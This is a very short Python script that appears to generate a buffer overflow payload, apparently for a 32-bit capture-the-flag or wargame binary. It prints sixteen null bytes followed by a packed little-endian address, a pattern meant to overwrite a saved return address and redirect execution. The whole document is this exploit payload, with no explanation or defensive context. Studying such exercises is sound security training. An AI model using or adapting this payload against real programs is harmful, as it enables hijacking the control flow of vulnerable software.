import sys




if __name__ == '__main__':
        print("\x00" * 16 + "\xa2\x88\x04\x08")

